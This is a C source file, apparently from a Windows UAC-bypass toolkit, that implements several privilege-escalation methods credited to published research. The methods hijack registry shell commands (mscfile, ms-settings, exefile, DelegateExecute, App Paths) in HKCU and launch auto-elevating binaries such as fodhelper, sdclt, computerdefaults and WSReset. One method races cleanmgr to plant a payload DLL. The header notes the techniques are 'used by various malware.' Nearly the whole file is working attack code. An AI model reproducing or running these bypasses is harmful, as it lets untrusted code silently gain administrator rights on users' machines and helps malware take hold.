/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       ENIGMA0X3.C
*
*  VERSION:     3.19
*
*  DATE:        22 May 2019
*
*  Enigma0x3 autoelevation methods and everything based on the same
*  ShellExecute related registry manipulations idea.
*
*  Used by various malware.
*
*  For description please visit original URL
*  https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
*  https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
*  https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
*  https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
*  https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
*  http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
*  https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

UCM_ENIGMA0x3_CTX g_EnigmaThreadCtx;

/*
* ucmHijackShellCommandMethod
*
* Purpose:
*
* Overwrite Default value of mscfile shell command with your payload.
*
* Fixed in Windows 10 RS2
*
*/
NTSTATUS ucmHijackShellCommandMethod(
    _In_opt_ LPWSTR lpszPayload,
    _In_ LPWSTR lpszTargetApp,
    _In_opt_ PVOID ProxyDll,
    _In_opt_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    HKEY    hKey = NULL;
    LRESULT lResult;
    LPWSTR  lpBuffer = NULL;
    SIZE_T  sz;
    WCHAR   szBuffer[MAX_PATH * 2];

    if (lpszTargetApp == NULL)
        return FALSE;

    do {

        sz = 0;
        if (lpszPayload == NULL) {
            sz = PAGE_SIZE;
        }
        else {
            sz = (1 + _strlen(lpszPayload)) * sizeof(WCHAR);
        }
        lpBuffer = (LPWSTR)supHeapAlloc(sz);
        if (lpBuffer == NULL)
            break;

        if (lpszPayload != NULL) {
            _strcpy(lpBuffer, lpszPayload);
        }
        else {
            //no payload specified, use default fubuki, drop dll first as wdscore.dll to %temp%
            if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
                return STATUS_DATA_ERROR;
            }
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            _strcpy(szBuffer, g_ctx->szTempDirectory);
            _strcat(szBuffer, WDSCORE_DLL);
            //write proxy dll to disk
            if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
                break;
            }

            //now rundll it
            _strcpy(lpBuffer, RUNDLL_EXE_CMD);
            _strcat(lpBuffer, szBuffer);
            _strcat(lpBuffer, L",WdsInitialize");
        }

        _strcpy(szBuffer, T_MSC_SHELL);
        _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
        lResult = RegCreateKeyEx(
            HKEY_CURRENT_USER,
            szBuffer,
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            MAXIMUM_ALLOWED,
            NULL,
            &hKey,
            NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set "Default" value as our payload.
        //
        sz = (1 + _strlen(lpBuffer)) * sizeof(WCHAR);
        lResult = RegSetValueEx(
            hKey,
            TEXT(""),
            0,
            REG_SZ,
            (BYTE*)lpBuffer,
            (DWORD)sz);

        if (lResult != ERROR_SUCCESS)
            break;

        if (supRunProcess(lpszTargetApp, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (lpBuffer != NULL)
        supHeapFree(lpBuffer);

    if (hKey != NULL)
        RegCloseKey(hKey);

    return MethodResult;
}

/*
* ucmDiskCleanupWorkerThread
*
* Purpose:
*
* Worker thread.
*
*/
DWORD ucmDiskCleanupWorkerThread(
    LPVOID Parameter
)
{
    NTSTATUS                    status;
    HANDLE                      hDirectory = NULL, hEvent = NULL;
    SIZE_T                      sz;
    PVOID                       Buffer = NULL;
    LPWSTR                      fp = NULL;
    UCM_ENIGMA0x3_CTX          *Context = (UCM_ENIGMA0x3_CTX *)Parameter;
    FILE_NOTIFY_INFORMATION    *pInfo = NULL;
    UNICODE_STRING              usName;
    IO_STATUS_BLOCK             IoStatusBlock;
    OBJECT_ATTRIBUTES           ObjectAttributes;
    WCHAR                       szFileName[MAX_PATH * 2], szTempBuffer[MAX_PATH + 1];

    do {

        RtlSecureZeroMemory(&usName, sizeof(usName));
        if (!RtlDosPathNameToNtPathName_U(Context->szTempDirectory, &usName, NULL, NULL))
            break;

        InitializeObjectAttributes(&ObjectAttributes, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);

        status = NtCreateFile(&hDirectory,
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &ObjectAttributes,
            &IoStatusBlock,
            NULL,
            FILE_OPEN_FOR_BACKUP_INTENT,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);

        if (!NT_SUCCESS(status))
            break;

        sz = 1024 * 1024;
        Buffer = supHeapAlloc(sz);
        if (Buffer == NULL)
            break;

        InitializeObjectAttributes(&ObjectAttributes, NULL, 0, 0, NULL);
        status = NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, &ObjectAttributes, NotificationEvent, FALSE);
        if (!NT_SUCCESS(status))
            break;

        do {

            status = NtNotifyChangeDirectoryFile(hDirectory, hEvent, NULL, NULL,
                &IoStatusBlock, Buffer, (ULONG)sz, FILE_NOTIFY_CHANGE_FILE_NAME, TRUE);

            if (status == STATUS_PENDING)
                NtWaitForSingleObject(hEvent, TRUE, NULL);

            NtSetEvent(hEvent, NULL);

            pInfo = (FILE_NOTIFY_INFORMATION*)Buffer;
            for (;;) {

                if (pInfo->Action == FILE_ACTION_ADDED) {

                    RtlSecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
                    _strncpy(szTempBuffer, MAX_PATH, pInfo->FileName, pInfo->FileNameLength / sizeof(WCHAR));

                    if ((szTempBuffer[8] == L'-') &&      //
                        (szTempBuffer[13] == L'-') &&     // If GUID form directory name.
                        (szTempBuffer[18] == L'-') &&     //
                        (szTempBuffer[23] == L'-'))
                    {
                        //If it is file after LogProvider.dll
                        fp = _filename(szTempBuffer);
                        if (_strcmpi(fp, PROVPROVIDER_DLL) == 0) {
                            RtlSecureZeroMemory(szFileName, sizeof(szFileName));
                            _strcpy(szFileName, Context->szTempDirectory);
                            fp = _filepath(szTempBuffer, szTempBuffer);
                            if (fp) {
                                _strcat(szFileName, fp); //slash on the end
                                _strcat(szFileName, LOGPROVIDER_DLL);
                                supWriteBufferToFile(szFileName, Context->PayloadDll, Context->PayloadDllSize);
                            }
                            status = STATUS_NO_SECRETS;
                        } //_strcmpi
                    } //guid test
                } //Action

                if (status == STATUS_NO_SECRETS)
                    break;

                pInfo = (FILE_NOTIFY_INFORMATION*)(((LPBYTE)pInfo) + pInfo->NextEntryOffset);
                if (pInfo->NextEntryOffset == 0)
                    break;
            }

        } while (NT_SUCCESS(status));

    } while (FALSE);

    if (usName.Buffer) {
        RtlFreeUnicodeString(&usName);
    }

    if (hDirectory != NULL)
        NtClose(hDirectory);

    if (hEvent)
        NtClose(hEvent);

    if (Buffer != NULL)
        supHeapFree(Buffer);

    return 0;
}

/*
* ucmDiskCleanupRaceCondition
*
* Purpose:
*
* Use cleanmgr innovation implemented in Windows 10+.
* Cleanmgr.exe uses full copy of dismhost.exe from local %temp% directory.
* RC friendly.
* Warning: this method works with AlwaysNotify UAC level.
*
* Fixed in Windows 10 RS2
*
*/
NTSTATUS ucmDiskCleanupRaceCondition(
    _In_ PVOID PayloadDll,
    _In_ DWORD PayloadDllSize
)
{
    NTSTATUS            MethodResult = STATUS_ACCESS_DENIED;
    DWORD               ti;
    HANDLE              hThread = NULL;
    SHELLEXECUTEINFO    shinfo;

    RtlSecureZeroMemory(&g_EnigmaThreadCtx, sizeof(g_EnigmaThreadCtx));

    g_EnigmaThreadCtx.PayloadDll = PayloadDll;
    g_EnigmaThreadCtx.PayloadDllSize = PayloadDllSize;
    _strcpy(g_EnigmaThreadCtx.szTempDirectory, g_ctx->szTempDirectory);

    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmDiskCleanupWorkerThread, &g_EnigmaThreadCtx, 0, &ti);
    if (hThread) {
        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = SCHTASKS_EXE;
        shinfo.lpParameters = T_SCHTASKS_CMD;
        shinfo.nShow = SW_SHOW;
        if (ShellExecuteEx(&shinfo)) {
            if (shinfo.hProcess != NULL) {
                WaitForSingleObject(shinfo.hProcess, INFINITE);
                CloseHandle(shinfo.hProcess);
            }
        }
        //
        // Because cleanmgr.exe is slow we need to wait enough time until it will try to launch dismhost.exe
        // It may happen very fast or really slow depending on resources usage.
        // Well lets hope 10 min is enough.
        //
        if (WaitForSingleObject(hThread, 60000 * 10) == WAIT_OBJECT_0)
            MethodResult = STATUS_SUCCESS;
        CloseHandle(hThread);
    }
    return MethodResult;
}

/*
* ucmAppPathMethod
*
* Purpose:
*
* Give target application our payload to execute because we can control App Path key data.
*
* E.g.
* lpszPayload = your.exe
* lpszAppPathTarget = control.exe
* lpszTargetApp = sdclt.exe
*
* Create key HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\<lpszAppPathTarget>
* Set default key value to <lpszPayload>
* Run <lpszTargetApp>
*
* Fixed in Windows 10 RS3
*
*/
NTSTATUS ucmAppPathMethod(
    _In_ LPWSTR lpszPayload,
    _In_ LPWSTR lpszAppPathTarget,
    _In_ LPWSTR lpszTargetApp
)
{
    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;

#ifndef _WIN64
    NTSTATUS Status;
#endif

    LRESULT lResult;
    HKEY    hKey = NULL;
    LPWSTR  lpKeyPath = NULL;
    SIZE_T  sz;

    if (lpszAppPathTarget == NULL)
        return STATUS_INVALID_PARAMETER_2;

    if (lpszTargetApp == NULL)
        return STATUS_INVALID_PARAMETER_3;

    //
    // If under Wow64 disable redirection.
    // Some target applications may not exists in wow64 folder.
    //
#ifndef _WIN64
    if (g_ctx->IsWow64) {
        Status = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(Status))
            return Status;
    }
#endif

    do {

        sz = (1 + _strlen(lpszAppPathTarget)) * sizeof(WCHAR) + sizeof(T_APP_PATH);
        lpKeyPath = (LPWSTR)supHeapAlloc(sz);
        if (lpKeyPath == NULL)
            break;

        // 
        // Create App Path key for our target app.
        //
        _strcpy(lpKeyPath, T_APP_PATH);
        _strcat(lpKeyPath, lpszAppPathTarget);
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
            lpKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);

        //
        // Set "Default" value as our payload.
        //
        if (lResult == ERROR_SUCCESS) {
            sz = (1 + _strlen(lpszPayload)) * sizeof(WCHAR);
            lResult = RegSetValueEx(
                hKey,
                TEXT(""),
                0,
                REG_SZ,
                (BYTE*)lpszPayload,
                (DWORD)sz);

            //
            // Finally run target app.
            //
            if (lResult == ERROR_SUCCESS)
                if (supRunProcess(lpszTargetApp, NULL))
                    MethodResult = STATUS_SUCCESS;

            RegCloseKey(hKey);
            RegDeleteKey(HKEY_CURRENT_USER, lpKeyPath);
        }

    } while (FALSE);

    if (lpKeyPath != NULL)
        supHeapFree(lpKeyPath);

    //
    // Reenable wow64 redirection if under wow64.
    //
#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif

    return MethodResult;
}

/*
* ucmSdcltIsolatedCommandMethod
*
* Purpose:
*
* Use IsolatedCommand value of exefile shell command for your payload.
* Trigger: sdclt.exe with /kickoffelev param (force it to use ShellExecuteEx)
*
* Additional triggers:
* (they won't be included because they are basically all the same)
*
*                        rstrui.exe with /runonce param
*                        SystemSettingsAdminFlows.exe with PushButtonReset param
*
* Fixed in Windows 10 RS4 (all cases)
*
*/
NTSTATUS ucmSdcltIsolatedCommandMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;

#ifndef _WIN64
    NTSTATUS Status;
#endif

    BOOL    bExist = FALSE;
    DWORD   cbData, cbOldData = 0;
    SIZE_T  sz = 0;
    LRESULT lResult;

    LPWSTR  lpTargetValue = NULL;
    HKEY    hKey = NULL;

    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szOldValue[MAX_PATH + 1];

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        Status = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(Status))
            return Status;
    }
#endif

    do {

        sz = _strlen(lpszPayload);

        _strcpy(szBuffer, T_EXEFILE_SHELL);
        _strcat(szBuffer, T_SHELL_RUNAS_COMMAND);
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // There is a fix of original concept in 16237 RS3.
        // Bypass it.
        //
        if (g_ctx->dwBuildNumber >= 16237) {
            lpTargetValue = TEXT("");
        }
        else {
            lpTargetValue = T_ISOLATEDCOMMAND;
        }

        //
        // Save old value if exist.
        //
        cbOldData = MAX_PATH * 2;
        RtlSecureZeroMemory(&szOldValue, sizeof(szOldValue));
        lResult = RegQueryValueEx(hKey, lpTargetValue, 0, NULL,
            (BYTE*)szOldValue, &cbOldData);
        if (lResult == ERROR_SUCCESS)
            bExist = TRUE;

        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));

        lResult = RegSetValueEx(
            hKey,
            lpTargetValue,
            0,
            REG_SZ,
            (BYTE*)lpszPayload,
            cbData);

        if (lResult == ERROR_SUCCESS) {
            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, SDCLT_EXE);

            if (supRunProcess(szBuffer, TEXT("/KICKOFFELEV")))
                MethodResult = STATUS_SUCCESS;

            if (bExist == FALSE) {
                //
                // We created this value, remove it.
                //
                RegDeleteValue(hKey, lpTargetValue);
            }
            else {
                //
                // Value was before us, restore original.
                //
                RegSetValueEx(hKey, lpTargetValue, 0, REG_SZ,
                    (BYTE*)szOldValue, cbOldData);
            }
        }

    } while (FALSE);

    if (hKey != NULL)
        RegCloseKey(hKey);

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif

    return MethodResult;
}

/*
* ucmMsSettingsDelegateExecuteMethod
*
* Purpose:
*
* Overwrite Default value of ms-settings shell command with your payload.
* Enable it with DelegateExecute value.
*
* Trigger: fodhelper.exe, computerdefaults.exe
*
*/
NTSTATUS ucmMsSettingsDelegateExecuteMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;

#ifndef _WIN64
    NTSTATUS Status;
#endif

    DWORD   cbData;
    SIZE_T  sz = 0;
    LRESULT lResult;
    LPWSTR lpTargetApp = NULL;
    HKEY    hKey = NULL;

    WCHAR szTempBuffer[MAX_PATH * 2];

    //
    // Trigger application doesn't exist in wow64.
    //
#ifndef _WIN64
    if (g_ctx->IsWow64) {
        Status = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(Status))
            return Status;
    }
#endif

    do {

        sz = _strlen(lpszPayload);

        _strcpy(szTempBuffer, T_MSSETTINGS);
        _strcat(szTempBuffer, T_SHELL_OPEN_COMMAND);
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szTempBuffer, 0, NULL,
            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set empty DelegateExecute value.
        //
        szTempBuffer[0] = 0;
        cbData = 0;
        lResult = RegSetValueEx(
            hKey,
            T_DELEGATEEXECUTE,
            0, REG_SZ,
            (BYTE*)szTempBuffer,
            cbData);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set "Default" value as our payload.
        //
        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));

        lResult = RegSetValueEx(
            hKey,
            TEXT(""),
            0, REG_SZ,
            (BYTE*)lpszPayload,
            cbData);

        if (lResult == ERROR_SUCCESS) {
            _strcpy(szTempBuffer, g_ctx->szSystemDirectory);

            //
            // Not because it was fixed but because this was added in RS4 _additionaly_
            //
            lpTargetApp = FODHELPER_EXE;

            if (g_ctx->dwBuildNumber > 16299) {

                if (IDYES == ucmShowQuestion(
                    TEXT("Would you like to use this method with ComputerDefaults.exe (YES) or Fodhelper.exe (NO)?")))
                {
                    lpTargetApp = COMPUTERDEFAULTS_EXE;
                }
            }

            _strcat(szTempBuffer, lpTargetApp);

            if (supRunProcess(szTempBuffer, NULL))
                MethodResult = STATUS_SUCCESS;

            supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSSETTINGS);
        }

    } while (FALSE);

    if (hKey != NULL)
        RegCloseKey(hKey);

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif

    return MethodResult;
}

/*
* ucmShellDelegateExecuteCommandMethod
*
* Purpose:
*
* Bypass UAC abusing COM entry hijack.
* Original authors links: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
*                         https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
*
* Targets:
*            sdclt.exe without params for Emeric Nasi method
*            WSReset.exe without params for Hashim Jawad method
*
*/
NTSTATUS ucmShellDelegateExecuteCommandMethod(
    _In_ LPWSTR lpTargetApp,
    _In_ SIZE_T cchTargetApp, //in chars, future use
    _In_ LPWSTR lpTargetKey,
    _In_ SIZE_T cchTargetKey, //in chars, future use
    _In_ LPWSTR lpPayload,
    _In_ SIZE_T cchPayload //in chars, future use
)
{
    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;

#ifndef _WIN64
    NTSTATUS Status;
#endif

    BOOL    bExist = FALSE, bDelegateExecuteExist = FALSE;
    DWORD   cbData, cbOldData = 0, cbOldDelegateData = 0, dwDisposition = 0;
    LRESULT lResult;

    LPWSTR  lpTargetValue = TEXT("");
    HKEY    hKey = NULL;

    WCHAR szKey[MAX_PATH + 1];
    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szOldValue[MAX_PATH + 1];
    WCHAR szOldDelegateExecute[MAX_PATH + 1];

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        Status = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(Status))
            return Status;
    }
#endif

#ifdef _DEBUG
    g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
#endif

    do {
        if ((cchTargetApp >= MAX_PATH) || (cchTargetApp == 0))
            return STATUS_INVALID_PARAMETER_2;
        if ((cchTargetKey >= MAX_PATH) || (cchTargetKey == 0))
            return STATUS_INVALID_PARAMETER_4;
        if (cchPayload == 0)
            return STATUS_INVALID_PARAMETER_6;

        _strcpy(szKey, lpTargetKey);
        _strcat(szKey, T_SHELL_OPEN_COMMAND);
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, &dwDisposition);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Save old value if exist.
        //
        cbOldData = MAX_PATH * 2;
        RtlSecureZeroMemory(&szOldValue, sizeof(szOldValue));
        lResult = RegQueryValueEx(hKey, lpTargetValue, 0, NULL,
            (BYTE*)szOldValue, &cbOldData);
        if (lResult == ERROR_SUCCESS)
            bExist = TRUE;

        //
        // Save old DelegateExecute value if exist.
        //
        cbOldDelegateData = MAX_PATH * 2;
        RtlSecureZeroMemory(&szOldDelegateExecute, sizeof(szOldDelegateExecute));
        lResult = RegQueryValueEx(hKey, T_DELEGATEEXECUTE, 0, NULL,
            (BYTE*)szOldDelegateExecute, &cbOldDelegateData);
        if (lResult == ERROR_SUCCESS)
            bDelegateExecuteExist = TRUE;

        lResult = ERROR_ACCESS_DENIED;

        switch (g_ctx->MethodExecuteType) {

        case ucmExTypeIndirectModification:

            //
            // Set empty DelegateExecute value.
            //
            if (supIndirectRegAdd(REG_HKCU,
                szKey,
                T_DELEGATEEXECUTE,
                T_REG_SZ,
                TEXT("")))
            {
                //
                // Set "Default" value.
                //
                if (supIndirectRegAdd(REG_HKCU,
                    szKey,
                    lpTargetValue,
                    T_REG_SZ,
                    lpPayload))
                {
                    lResult = ERROR_SUCCESS;
                }
            }

            break;

        case ucmExTypeDefault:
        default:

            //
            // Set empty DelegateExecute value.
            //
            cbData = 0;
            szBuffer[0] = 0;
            lResult = RegSetValueEx(
                hKey,
                T_DELEGATEEXECUTE,
                0, REG_SZ,
                (BYTE*)szBuffer,
                cbData);

            if (lResult == ERROR_SUCCESS) {

                //
                // Set "Default" value.
                //
                cbData = (DWORD)((1 + cchPayload) * sizeof(WCHAR));
                lResult = RegSetValueEx(
                    hKey,
                    lpTargetValue,
                    0, REG_SZ,
                    (BYTE*)lpPayload,
                    cbData);

            }

            break;
        }

        if (lResult == ERROR_SUCCESS) {

            RegFlushKey(hKey);

            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, lpTargetApp);
            if (supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, TRUE))
                MethodResult = STATUS_SUCCESS;

            Sleep(5000);  //wait a bit until this shell shit complete it internals
                          //not required if you don't cleanup or use reg.exe

            if (bExist == FALSE) {
                //
                // We created this value, remove it.
                //
                RegDeleteValue(hKey, lpTargetValue);

            }
            else {
                //
                // Value was before us, restore original.
                //
                switch (g_ctx->MethodExecuteType) {

                case ucmExTypeIndirectModification:
                
                    supIndirectRegAdd(REG_HKCU,
                        szKey,
                        lpTargetValue,
                        T_REG_SZ,
                        szOldValue);

                    break;
                
                default:
                    RegSetValueEx(hKey, lpTargetValue, 0, REG_SZ,
                        (BYTE*)szOldValue, cbOldData);
                    break;
                }
            }
        }

        //
        // If DelegateExecute was before restore it else remove.
        //
        if (bDelegateExecuteExist) {
            switch (g_ctx->MethodExecuteType) {

            case ucmExTypeIndirectModification:

                supIndirectRegAdd(REG_HKCU,
                    szKey,
                    T_DELEGATEEXECUTE,
                    T_REG_SZ,
                    szOldDelegateExecute);

                break;

            case ucmExTypeDefault:
            default:
                RegSetValueEx(hKey, T_DELEGATEEXECUTE, 0, REG_SZ,
                    (BYTE*)szOldDelegateExecute, cbOldDelegateData);
                break;
            }
        }
        else {
            RegDeleteValue(hKey, T_DELEGATEEXECUTE);
        }

    } while (FALSE);

    if (hKey != NULL)
        RegCloseKey(hKey);

    if (dwDisposition == REG_CREATED_NEW_KEY) {
        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, lpTargetKey);
    }


#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif

    return MethodResult;
}
